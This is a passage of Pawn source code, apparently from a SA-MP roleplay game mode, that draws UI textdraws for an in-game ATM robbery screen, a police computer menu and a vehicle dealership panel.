		PlayerTextDrawLetterSize(playerid, ATM_pTD[playerid][5], 0.000000, -0.266665);
		PlayerTextDrawTextSize(playerid, ATM_pTD[playerid][5], 419.407836, 0.000000);
		PlayerTextDrawAlignment(playerid, ATM_pTD[playerid][5], 1);
		PlayerTextDrawColor(playerid, ATM_pTD[playerid][5], -1);
		PlayerTextDrawUseBox(playerid, ATM_pTD[playerid][5], 1);
		PlayerTextDrawBoxColor(playerid, ATM_pTD[playerid][5], 0x4282C0FF);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][5], 0);
		PlayerTextDrawSetOutline(playerid, ATM_pTD[playerid][5], 0);
		PlayerTextDrawBackgroundColor(playerid, ATM_pTD[playerid][5], 255);
		PlayerTextDrawFont(playerid, ATM_pTD[playerid][5], 1);
		PlayerTextDrawSetProportional(playerid, ATM_pTD[playerid][5], 1);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][5], 0);

		ATM_pTD[playerid][6] = CreatePlayerTextDraw(playerid, 229.133300, 276.496856, "box");
		PlayerTextDrawLetterSize(playerid, ATM_pTD[playerid][6], 0.000000, -0.266665);
		PlayerTextDrawTextSize(playerid, ATM_pTD[playerid][6], 290.799987, 0.000000);
		PlayerTextDrawAlignment(playerid, ATM_pTD[playerid][6], 1);
		PlayerTextDrawColor(playerid, ATM_pTD[playerid][6], -1);
		PlayerTextDrawUseBox(playerid, ATM_pTD[playerid][6], 1);
		PlayerTextDrawBoxColor(playerid, ATM_pTD[playerid][6], 0x4282C0FF);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][6], 0);
		PlayerTextDrawSetOutline(playerid, ATM_pTD[playerid][6], 0);
		PlayerTextDrawBackgroundColor(playerid, ATM_pTD[playerid][6], 255);
		PlayerTextDrawFont(playerid, ATM_pTD[playerid][6], 1);
		PlayerTextDrawSetProportional(playerid, ATM_pTD[playerid][6], 1);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][6], 0);

		ATM_pTD[playerid][7] = CreatePlayerTextDraw(playerid, 229.333328, 205.992553, "box");
		PlayerTextDrawLetterSize(playerid, ATM_pTD[playerid][7], 0.000000, -0.299997);
		PlayerTextDrawTextSize(playerid, ATM_pTD[playerid][7], 263.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, ATM_pTD[playerid][7], 1);
		PlayerTextDrawColor(playerid, ATM_pTD[playerid][7], -1);
		PlayerTextDrawUseBox(playerid, ATM_pTD[playerid][7], 1);
		PlayerTextDrawBoxColor(playerid, ATM_pTD[playerid][7], 0x4282C0FF);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][7], 0);
		PlayerTextDrawSetOutline(playerid, ATM_pTD[playerid][7], 0);
		PlayerTextDrawBackgroundColor(playerid, ATM_pTD[playerid][7], 255);
		PlayerTextDrawFont(playerid, ATM_pTD[playerid][7], 1);
		PlayerTextDrawSetProportional(playerid, ATM_pTD[playerid][7], 1);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][7], 0);

		ATM_pTD[playerid][8] = CreatePlayerTextDraw(playerid, 385.942871, 205.992553, "box");
		PlayerTextDrawLetterSize(playerid, ATM_pTD[playerid][8], 0.000000, -0.299997);
		PlayerTextDrawTextSize(playerid, ATM_pTD[playerid][8], 419.609558, 0.000000);
		PlayerTextDrawAlignment(playerid, ATM_pTD[playerid][8], 1);
		PlayerTextDrawColor(playerid, ATM_pTD[playerid][8], -1);
		PlayerTextDrawUseBox(playerid, ATM_pTD[playerid][8], 1);
		PlayerTextDrawBoxColor(playerid, ATM_pTD[playerid][8], 0x4282C0FF);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][8], 0);
		PlayerTextDrawSetOutline(playerid, ATM_pTD[playerid][8], 0);
		PlayerTextDrawBackgroundColor(playerid, ATM_pTD[playerid][8], 255);
		PlayerTextDrawFont(playerid, ATM_pTD[playerid][8], 1);
		PlayerTextDrawSetProportional(playerid, ATM_pTD[playerid][8], 1);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][8], 0);

		ATM_pTD[playerid][9] = CreatePlayerTextDraw(playerid, 385.942871, 277.096893, "box");
		PlayerTextDrawLetterSize(playerid, ATM_pTD[playerid][9], 0.000000, -0.299997);
		PlayerTextDrawTextSize(playerid, ATM_pTD[playerid][9], 419.609558, 0.000000);
		PlayerTextDrawAlignment(playerid, ATM_pTD[playerid][9], 1);
		PlayerTextDrawColor(playerid, ATM_pTD[playerid][9], -1);
		PlayerTextDrawUseBox(playerid, ATM_pTD[playerid][9], 1);
		PlayerTextDrawBoxColor(playerid, ATM_pTD[playerid][9], 0x4282C0FF);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][9], 0);
		PlayerTextDrawSetOutline(playerid, ATM_pTD[playerid][9], 0);
		PlayerTextDrawBackgroundColor(playerid, ATM_pTD[playerid][9], 255);
		PlayerTextDrawFont(playerid, ATM_pTD[playerid][9], 1);
		PlayerTextDrawSetProportional(playerid, ATM_pTD[playerid][9], 1);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][9], 0);

		ATM_pTD[playerid][10] = CreatePlayerTextDraw(playerid, 229.333312, 277.096893, "box");
		PlayerTextDrawLetterSize(playerid, ATM_pTD[playerid][10], 0.000000, -0.299997);
		PlayerTextDrawTextSize(playerid, ATM_pTD[playerid][10], 263.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, ATM_pTD[playerid][10], 1);
		PlayerTextDrawColor(playerid, ATM_pTD[playerid][10], -1);
		PlayerTextDrawUseBox(playerid, ATM_pTD[playerid][10], 1);
		PlayerTextDrawBoxColor(playerid, ATM_pTD[playerid][10], 0x4282C0FF);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][10], 0);
		PlayerTextDrawSetOutline(playerid, ATM_pTD[playerid][10], 0);
		PlayerTextDrawBackgroundColor(playerid, ATM_pTD[playerid][10], 255);
		PlayerTextDrawFont(playerid, ATM_pTD[playerid][10], 1);
		PlayerTextDrawSetProportional(playerid, ATM_pTD[playerid][10], 1);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][10], 0);

		ATM_pTD[playerid][11] = CreatePlayerTextDraw(playerid, 222.666625, 201.200012, "+");
		PlayerTextDrawLetterSize(playerid, ATM_pTD[playerid][11], 0.172333, 0.708145);
		PlayerTextDrawAlignment(playerid, ATM_pTD[playerid][11], 2);
		PlayerTextDrawColor(playerid, ATM_pTD[playerid][11], 0x4282C0FF);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][11], 0);
		PlayerTextDrawSetOutline(playerid, ATM_pTD[playerid][11], 0);
		PlayerTextDrawBackgroundColor(playerid, ATM_pTD[playerid][11], 255);
		PlayerTextDrawFont(playerid, ATM_pTD[playerid][11], 2);
		PlayerTextDrawSetProportional(playerid, ATM_pTD[playerid][11], 1);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][11], 0);

		ATM_pTD[playerid][12] = CreatePlayerTextDraw(playerid, 426.066589, 272.218566, "+");
		PlayerTextDrawLetterSize(playerid, ATM_pTD[playerid][12], 0.172333, 0.708145);
		PlayerTextDrawAlignment(playerid, ATM_pTD[playerid][12], 2);
		PlayerTextDrawColor(playerid, ATM_pTD[playerid][12], 0x4282C0FF);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][12], 0);
		PlayerTextDrawSetOutline(playerid, ATM_pTD[playerid][12], 0);
		PlayerTextDrawBackgroundColor(playerid, ATM_pTD[playerid][12], 255);
		PlayerTextDrawFont(playerid, ATM_pTD[playerid][12], 2);
		PlayerTextDrawSetProportional(playerid, ATM_pTD[playerid][12], 1);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][12], 0);

		ATM_pTD[playerid][13] = CreatePlayerTextDraw(playerid, 287.166656, 196.192733, "ld_beat:chit");
		PlayerTextDrawLetterSize(playerid, ATM_pTD[playerid][13], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, ATM_pTD[playerid][13], 2.000000, 90.000000);
		PlayerTextDrawAlignment(playerid, ATM_pTD[playerid][13], 1);
		PlayerTextDrawColor(playerid, ATM_pTD[playerid][13], 0x4282C0FF);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][13], 0);
		PlayerTextDrawSetOutline(playerid, ATM_pTD[playerid][13], 0);
		PlayerTextDrawBackgroundColor(playerid, ATM_pTD[playerid][13], 255);
		PlayerTextDrawFont(playerid, ATM_pTD[playerid][13], 4);
		PlayerTextDrawSetProportional(playerid, ATM_pTD[playerid][13], 0);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][13], 0);

		ATM_pTD[playerid][14] = CreatePlayerTextDraw(playerid, 359.066711, 196.096282, "ld_beat:chit");
		PlayerTextDrawLetterSize(playerid, ATM_pTD[playerid][14], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, ATM_pTD[playerid][14], 2.000000, 90.000000);
		PlayerTextDrawAlignment(playerid, ATM_pTD[playerid][14], 1);
		PlayerTextDrawColor(playerid, ATM_pTD[playerid][14], 0x4282C0FF);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][14], 0);
		PlayerTextDrawSetOutline(playerid, ATM_pTD[playerid][14], 0);
		PlayerTextDrawBackgroundColor(playerid, ATM_pTD[playerid][14], 255);
		PlayerTextDrawFont(playerid, ATM_pTD[playerid][14], 4);
		PlayerTextDrawSetProportional(playerid, ATM_pTD[playerid][14], 0);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][14], 0);

		ATM_pTD[playerid][15] = CreatePlayerTextDraw(playerid, 245.266525, 224.359313, "");
		PlayerTextDrawLetterSize(playerid, ATM_pTD[playerid][15], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, ATM_pTD[playerid][15], 29.000000, 31.000000);
		PlayerTextDrawAlignment(playerid, ATM_pTD[playerid][15], 1);
		PlayerTextDrawColor(playerid, ATM_pTD[playerid][15], -1);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][15], 0);
		PlayerTextDrawSetOutline(playerid, ATM_pTD[playerid][15], 0);
		PlayerTextDrawBackgroundColor(playerid, ATM_pTD[playerid][15], 0);
		PlayerTextDrawFont(playerid, ATM_pTD[playerid][15], 5);
		PlayerTextDrawSetProportional(playerid, ATM_pTD[playerid][15], 0);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][15], 0);
		PlayerTextDrawSetSelectable(playerid, ATM_pTD[playerid][15], true);
		PlayerTextDrawSetPreviewModel(playerid, ATM_pTD[playerid][15], 335);
		PlayerTextDrawSetPreviewRot(playerid, ATM_pTD[playerid][15], -25.000000, 0.000000, 25.000000, 1.000000);

		ATM_pTD[playerid][16] = CreatePlayerTextDraw(playerid, 304.533203, 215.407363, "");
		PlayerTextDrawLetterSize(playerid, ATM_pTD[playerid][16], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, ATM_pTD[playerid][16], 39.000000, 40.000000);
		PlayerTextDrawAlignment(playerid, ATM_pTD[playerid][16], 1);
		PlayerTextDrawColor(playerid, ATM_pTD[playerid][16], -1);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][16], 0);
		PlayerTextDrawSetOutline(playerid, ATM_pTD[playerid][16], 0);
		PlayerTextDrawBackgroundColor(playerid, ATM_pTD[playerid][16], 0);
		PlayerTextDrawFont(playerid, ATM_pTD[playerid][16], 5);
		PlayerTextDrawSetProportional(playerid, ATM_pTD[playerid][16], 0);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][16], 0);
		PlayerTextDrawSetSelectable(playerid, ATM_pTD[playerid][16], true);
		PlayerTextDrawSetPreviewModel(playerid, ATM_pTD[playerid][16], 19893);
		PlayerTextDrawSetPreviewRot(playerid, ATM_pTD[playerid][16], 0.000000, 0.000000, 160.000000, 1.000000);

		ATM_pTD[playerid][17] = CreatePlayerTextDraw(playerid, 372.299957, 217.866668, "");
		PlayerTextDrawLetterSize(playerid, ATM_pTD[playerid][17], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, ATM_pTD[playerid][17], 39.000000, 40.000000);
		PlayerTextDrawAlignment(playerid, ATM_pTD[playerid][17], 1);
		PlayerTextDrawColor(playerid, ATM_pTD[playerid][17], -1);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][17], 0);
		PlayerTextDrawSetOutline(playerid, ATM_pTD[playerid][17], 0);
		PlayerTextDrawBackgroundColor(playerid, ATM_pTD[playerid][17], 0);
		PlayerTextDrawFont(playerid, ATM_pTD[playerid][17], 5);
		PlayerTextDrawSetProportional(playerid, ATM_pTD[playerid][17], 0);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][17], 0);
		PlayerTextDrawSetSelectable(playerid, ATM_pTD[playerid][17], true);
		PlayerTextDrawSetPreviewModel(playerid, ATM_pTD[playerid][17], 1550);
		PlayerTextDrawSetPreviewRot(playerid, ATM_pTD[playerid][17], 0.000000, 0.000000, 0.000000, 1.000000);

		ATM_pTD[playerid][18] = CreatePlayerTextDraw(playerid, 322.399932, 263.607543, "presecanje_zica____________________hakovanje_____________________kradja_novca");
		PlayerTextDrawLetterSize(playerid, ATM_pTD[playerid][18], 0.126331, 0.753776);
		PlayerTextDrawAlignment(playerid, ATM_pTD[playerid][18], 2);
		PlayerTextDrawColor(playerid, ATM_pTD[playerid][18], -1);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][18], 0);
		PlayerTextDrawSetOutline(playerid, ATM_pTD[playerid][18], 0);
		PlayerTextDrawBackgroundColor(playerid, ATM_pTD[playerid][18], 255);
		PlayerTextDrawFont(playerid, ATM_pTD[playerid][18], 2);
		PlayerTextDrawSetProportional(playerid, ATM_pTD[playerid][18], 1);
		PlayerTextDrawSetShadow(playerid, ATM_pTD[playerid][18], 0);

		for( new i = 0; i < 19; i++) PlayerTextDrawShow( playerid, ATM_pTD[ playerid ][ i ] );

		ShowedATMTD[ playerid ] = true;
	}
	else if( show == false )
	{
		CancelSelectTextDraw( playerid );
	    ShowedATMTD[ playerid ] = false;

		for(new i = 0; i < 19; i++)
		{
			PlayerTextDrawHide( playerid, ATM_pTD[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, ATM_pTD[ playerid ][ i ] );
			ATM_pTD[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
	}
}
//------------------------------------------------------------------------------
_:public Police_TVTDControl( playerid, bool:show )
{
	if( show == true )
	{
	    Police_TV[ playerid ][ 0 ] = CreatePlayerTextDraw( playerid,28.000, 155.500, "LD_DRV:tvbase");
	    PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 0 ], 4);
	    PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 0 ], 178.000, 169.000);
	    PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 0 ], 0x4282C0FF);

	    Police_TV[ playerid ][ 1 ] = CreatePlayerTextDraw( playerid,23.500, 148.000, "LD_DUAL:tvcorn");
	    PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 1 ], 4);
	    PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 1 ], 100.000, 100.000);
	    PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 1 ], -1);

	    Police_TV[ playerid ][ 2 ] = CreatePlayerTextDraw( playerid,209.500, 148.000, "LD_DRV:tvcorn");
	    PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 2 ], 4);
	    PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 2 ], -99.500, 104.500);
	    PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 2 ], -1);

	    Police_TV[ playerid ][ 3 ] = CreatePlayerTextDraw( playerid,23.500, 329.500, "LD_DRV:tvcorn");
	    PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 3 ], 4);
	    PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 3 ], 100.000, -104.000);
	    PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 3 ], -1);

	    Police_TV[ playerid ][ 4 ] = CreatePlayerTextDraw( playerid,209.500, 329.500, "LD_DRV:tvcorn");
	    PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 4 ], 4);
	    PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 4 ], -98.000, -101.000);
	    PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 4 ], -1);

	    Police_TV[ playerid ][ 5 ] = CreatePlayerTextDraw( playerid,118.000000, 170.000000, "Police Computer");
		PlayerTextDrawAlignment( playerid, Police_TV[ playerid ][ 5 ], 2);
		PlayerTextDrawBackgroundColor( playerid, Police_TV[ playerid ][ 5 ], 255);
		PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 5 ], 2);
		PlayerTextDrawLetterSize( playerid, Police_TV[ playerid ][ 5 ], 0.370000, 0.699999);
		PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 5 ], -1);
		PlayerTextDrawSetOutline( playerid, Police_TV[ playerid ][ 5 ], 0);
		PlayerTextDrawSetProportional( playerid, Police_TV[ playerid ][ 5 ], 1);
		PlayerTextDrawSetShadow( playerid, Police_TV[ playerid ][ 5 ], 1);
		PlayerTextDrawSetSelectable( playerid, Police_TV[ playerid ][ 5 ], 0);

		Police_TV[ playerid ][ 6 ] = CreatePlayerTextDraw( playerid,115.000000, 177.000000, "-");
		PlayerTextDrawAlignment( playerid, Police_TV[ playerid ][ 6 ], 2);
		PlayerTextDrawBackgroundColor( playerid, Police_TV[ playerid ][ 6 ], 255);
		PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 6 ], 2);
		PlayerTextDrawLetterSize( playerid, Police_TV[ playerid ][ 6 ], 14.970021, 0.699999);
		PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 6 ], 16777215);
		PlayerTextDrawSetOutline( playerid, Police_TV[ playerid ][ 6 ], 0);
		PlayerTextDrawSetProportional( playerid, Police_TV[ playerid ][ 6 ], 1);
		PlayerTextDrawSetShadow( playerid, Police_TV[ playerid ][ 6 ], 1);
		PlayerTextDrawSetSelectable( playerid, Police_TV[ playerid ][ 6 ], 0);

		Police_TV[ playerid ][ 7 ] = CreatePlayerTextDraw( playerid,98.000000, 201.000000, "-_Trazenje_po_imenu");
		PlayerTextDrawAlignment( playerid, Police_TV[ playerid ][ 7 ], 2);
		PlayerTextDrawBackgroundColor( playerid, Police_TV[ playerid ][ 7 ], 255);
		PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 7 ], 1);
		PlayerTextDrawLetterSize( playerid, Police_TV[ playerid ][ 7 ], 0.370000, 0.699999);
		PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 7 ], -1);
		PlayerTextDrawSetOutline( playerid, Police_TV[ playerid ][ 7 ], 0);
		PlayerTextDrawSetProportional( playerid, Police_TV[ playerid ][ 7 ], 1);
		PlayerTextDrawSetShadow( playerid, Police_TV[ playerid ][ 7 ], 1);
		PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 7 ], 10.000000, 100.000000);
		PlayerTextDrawSetSelectable( playerid, Police_TV[ playerid ][ 7 ], 1);

		Police_TV[ playerid ][ 8 ] = CreatePlayerTextDraw( playerid,111.000000, 212.000000, "-_Trazenje_po_registraciji");
		PlayerTextDrawAlignment( playerid, Police_TV[ playerid ][ 8 ], 2);
		PlayerTextDrawBackgroundColor( playerid, Police_TV[ playerid ][ 8 ], 255);
		PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 8 ], 1);
		PlayerTextDrawLetterSize( playerid, Police_TV[ playerid ][ 8 ], 0.370000, 0.699999);
		PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 8 ], -1);
		PlayerTextDrawSetOutline( playerid, Police_TV[ playerid ][ 8 ], 0);
		PlayerTextDrawSetProportional( playerid, Police_TV[ playerid ][ 8 ], 1);
		PlayerTextDrawSetShadow( playerid, Police_TV[ playerid ][ 8 ], 1);
		PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 8 ], 10.000000, 100.000000);
		PlayerTextDrawSetSelectable( playerid, Police_TV[ playerid ][ 8 ], 1);

		Police_TV[ playerid ][ 9 ] = CreatePlayerTextDraw( playerid,96.000000, 221.000000, "-_Popis_zatvorenika");
		PlayerTextDrawAlignment( playerid, Police_TV[ playerid ][ 9 ], 2);
		PlayerTextDrawBackgroundColor( playerid, Police_TV[ playerid ][ 9 ], 255);
		PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 9 ], 1);
		PlayerTextDrawLetterSize( playerid, Police_TV[ playerid ][ 9 ], 0.370000, 0.699999);
		PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 9 ], -1);
		PlayerTextDrawSetOutline( playerid, Police_TV[ playerid ][ 9 ], 0);
		PlayerTextDrawSetProportional( playerid, Police_TV[ playerid ][ 9 ], 1);
		PlayerTextDrawSetShadow( playerid, Police_TV[ playerid ][ 9 ], 1);
		PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 9 ], 10.000000, 100.000000);
		PlayerTextDrawSetSelectable( playerid, Police_TV[ playerid ][ 9 ], 1);

		Police_TV[ playerid ][ 10 ] = CreatePlayerTextDraw( playerid,97.000000, 241.000000, "-_Popis_osumnjicenih");
		PlayerTextDrawAlignment( playerid, Police_TV[ playerid ][ 10 ], 2);
		PlayerTextDrawBackgroundColor( playerid, Police_TV[ playerid ][ 10 ], 255);
		PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 10 ], 1);
		PlayerTextDrawLetterSize( playerid, Police_TV[ playerid ][ 10 ], 0.370000, 0.699999);
		PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 10 ], -1);
		PlayerTextDrawSetOutline( playerid, Police_TV[ playerid ][ 10 ], 0);
		PlayerTextDrawSetProportional( playerid, Police_TV[ playerid ][ 10 ], 1);
		PlayerTextDrawSetShadow( playerid, Police_TV[ playerid ][ 10 ], 1);
		PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 10 ], 10.000000, 100.000000);
		PlayerTextDrawSetSelectable( playerid, Police_TV[ playerid ][ 10 ], 1);

		Police_TV[ playerid ][ 11 ] = CreatePlayerTextDraw( playerid,88.000000, 231.000000, "-_Poziv_pojacanja");
		PlayerTextDrawAlignment( playerid, Police_TV[ playerid ][ 11 ], 2);
		PlayerTextDrawBackgroundColor( playerid, Police_TV[ playerid ][ 11 ], 255);
		PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 11 ], 1);
		PlayerTextDrawLetterSize( playerid, Police_TV[ playerid ][ 11 ], 0.370000, 0.699999);
		PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 11 ], -1);
		PlayerTextDrawSetOutline( playerid, Police_TV[ playerid ][ 11 ], 0);
		PlayerTextDrawSetProportional( playerid, Police_TV[ playerid ][ 11 ], 1);
		PlayerTextDrawSetShadow( playerid, Police_TV[ playerid ][ 11 ], 1);
		PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 11 ], 10.000000, 100.000000);
		PlayerTextDrawSetSelectable( playerid, Police_TV[ playerid ][ 11 ], 1);

		Police_TV[ playerid ][ 12 ] = CreatePlayerTextDraw( playerid,78.000000, 251.000000, "-_Ocisti_dosije");
		PlayerTextDrawAlignment( playerid, Police_TV[ playerid ][ 12 ], 2);
		PlayerTextDrawBackgroundColor( playerid, Police_TV[ playerid ][ 12 ], 255);
		PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 12 ], 1);
		PlayerTextDrawLetterSize( playerid, Police_TV[ playerid ][ 12 ], 0.370000, 0.699999);
		PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 12 ], -1);
		PlayerTextDrawSetOutline( playerid, Police_TV[ playerid ][ 12 ], 0);
		PlayerTextDrawSetProportional( playerid, Police_TV[ playerid ][ 12 ], 1);
		PlayerTextDrawSetShadow( playerid, Police_TV[ playerid ][ 12 ], 1);
		PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 12 ], 10.000000, 100.000000);
		PlayerTextDrawSetSelectable( playerid, Police_TV[ playerid ][ 12 ], 1);

		Police_TV[ playerid ][ 13 ] = CreatePlayerTextDraw( playerid,87.000000, 261.000000, "-_Postavi_poteru");
		PlayerTextDrawAlignment( playerid, Police_TV[ playerid ][ 13 ], 2);
		PlayerTextDrawBackgroundColor( playerid, Police_TV[ playerid ][ 13 ], 255);
		PlayerTextDrawFont( playerid, Police_TV[ playerid ][ 13 ], 1);
		PlayerTextDrawLetterSize( playerid, Police_TV[ playerid ][ 13 ], 0.370000, 0.699999);
		PlayerTextDrawColor( playerid, Police_TV[ playerid ][ 13 ], -1);
		PlayerTextDrawSetOutline( playerid, Police_TV[ playerid ][ 13 ], 0);
		PlayerTextDrawSetProportional( playerid, Police_TV[ playerid ][ 13 ], 1);
		PlayerTextDrawSetShadow( playerid, Police_TV[ playerid ][ 13 ], 1);
		PlayerTextDrawTextSize( playerid, Police_TV[ playerid ][ 13 ], 10.000000, 100.000000);
		PlayerTextDrawSetSelectable( playerid, Police_TV[ playerid ][ 13 ], 1);

	    for( new i = 0; i < 14; i++)
		{
			PlayerTextDrawShow( playerid, Police_TV[ playerid ][ i ] );
		}
    }
	else if( show == false )
	{
		for( new i = 0; i < 14; i ++)
		{
			PlayerTextDrawHide( playerid, Police_TV[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, Police_TV[ playerid ][ i ] );
			Police_TV[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
	}
}

//------------------------------------------------------------------------------

ControlTextDrawVehBuy(playerid, bool:show)
{
	if(show)
	{
		SalonVozila_pTD[playerid][0] = CreatePlayerTextDraw(playerid, 557.031494, 178.873977, "box");
		PlayerTextDrawLetterSize(playerid, SalonVozila_pTD[playerid][0], 0.000000, 13.133331);
		PlayerTextDrawTextSize(playerid, SalonVozila_pTD[playerid][0], 636.698364, 0.000000);
		PlayerTextDrawAlignment(playerid, SalonVozila_pTD[playerid][0], 1);
		PlayerTextDrawColor(playerid, SalonVozila_pTD[playerid][0], -1);
		PlayerTextDrawUseBox(playerid, SalonVozila_pTD[playerid][0], 1);
		PlayerTextDrawBoxColor(playerid, SalonVozila_pTD[playerid][0], -1978987521);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][0], 0);
		PlayerTextDrawSetOutline(playerid, SalonVozila_pTD[playerid][0], 0);
		PlayerTextDrawBackgroundColor(playerid, SalonVozila_pTD[playerid][0], 255);
		PlayerTextDrawFont(playerid, SalonVozila_pTD[playerid][0], 1);
		PlayerTextDrawSetProportional(playerid, SalonVozila_pTD[playerid][0], 1);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][0], 0);

		SalonVozila_pTD[playerid][1] = CreatePlayerTextDraw(playerid, 558.031250, 180.274063, "box");
		PlayerTextDrawLetterSize(playerid, SalonVozila_pTD[playerid][1], 0.000000, 12.861667);
		PlayerTextDrawTextSize(playerid, SalonVozila_pTD[playerid][1], 635.740112, 0.000000);
		PlayerTextDrawAlignment(playerid, SalonVozila_pTD[playerid][1], 1);
		PlayerTextDrawColor(playerid, SalonVozila_pTD[playerid][1], -1);
		PlayerTextDrawUseBox(playerid, SalonVozila_pTD[playerid][1], 1);
		PlayerTextDrawBoxColor(playerid, SalonVozila_pTD[playerid][1], 1577255935);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][1], 0);
		PlayerTextDrawSetOutline(playerid, SalonVozila_pTD[playerid][1], 0);
		PlayerTextDrawBackgroundColor(playerid, SalonVozila_pTD[playerid][1], 255);
		PlayerTextDrawFont(playerid, SalonVozila_pTD[playerid][1], 1);
		PlayerTextDrawSetProportional(playerid, SalonVozila_pTD[playerid][1], 1);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][1], 0);

		SalonVozila_pTD[playerid][2] = CreatePlayerTextDraw(playerid, 597.699829, 167.733139, "Dealership");
		PlayerTextDrawLetterSize(playerid, SalonVozila_pTD[playerid][2], 0.281333, 1.164444);
		PlayerTextDrawAlignment(playerid, SalonVozila_pTD[playerid][2], 2);
		PlayerTextDrawColor(playerid, SalonVozila_pTD[playerid][2], -1);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][2], 0);
		PlayerTextDrawSetOutline(playerid, SalonVozila_pTD[playerid][2], 1);
		PlayerTextDrawBackgroundColor(playerid, SalonVozila_pTD[playerid][2], 255);
		PlayerTextDrawFont(playerid, SalonVozila_pTD[playerid][2], 0);
		PlayerTextDrawSetProportional(playerid, SalonVozila_pTD[playerid][2], 1);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][2], 0);

		SalonVozila_pTD[playerid][3] = CreatePlayerTextDraw(playerid, 557.166992, 179.174118, "");
		PlayerTextDrawLetterSize(playerid, SalonVozila_pTD[playerid][3], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, SalonVozila_pTD[playerid][3], 79.570121, 73.980209);
		PlayerTextDrawAlignment(playerid, SalonVozila_pTD[playerid][3], 1);
		PlayerTextDrawColor(playerid, SalonVozila_pTD[playerid][3], -1);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][3], 0);
		PlayerTextDrawSetOutline(playerid, SalonVozila_pTD[playerid][3], 0);
		PlayerTextDrawBackgroundColor(playerid, SalonVozila_pTD[playerid][3], 939589990);
		PlayerTextDrawFont(playerid, SalonVozila_pTD[playerid][3], 5);
		PlayerTextDrawSetProportional(playerid, SalonVozila_pTD[playerid][3], 0);
		PlayerTextDrawSetShadow(playerid, SalonVozila_pTD[playerid][3], 0);
		PlayerTextDrawSetPreviewModel(playerid, SalonVozila_pTD[playerid][3], SalonVozila[as_Model[playerid]][vID]);
